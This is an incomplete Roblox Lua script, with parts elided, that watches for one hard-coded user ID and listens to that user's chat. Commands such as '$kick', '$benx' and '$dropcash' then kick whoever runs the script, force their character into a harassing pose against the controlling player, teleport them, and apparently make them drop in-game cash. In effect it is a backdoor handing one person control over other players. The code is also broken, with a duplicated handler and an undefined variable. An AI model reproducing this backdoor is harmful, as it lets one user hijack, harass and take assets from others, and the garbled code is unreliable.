while true do 
	local p2_lua = game:GetService("Players"):GetPlayerByUserId(3254506659) --jestemfajny780
		if p2_lua then
		...
		p2_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p2_lua then
		...
		p2_lua.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= p2_lua then
					...
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = p2_lua.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						...
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p2_lua.Character.HumanoidRootPart.CFrame + p2_lua.Character.HumanoidRootPart.CFrame.lookVector * 0.5
		...
		p2_lua.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= p2_lua then
					...
					wait(15)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p2_lua.Character.UpperTorso.Position)
				end
			end
		...
		p2_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p2_lua then
					game.Players.LocalPlayer:Kick("Kicked by p2_lua user")
				end
			end
		...
		p2_lua.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= p2_lua2 then
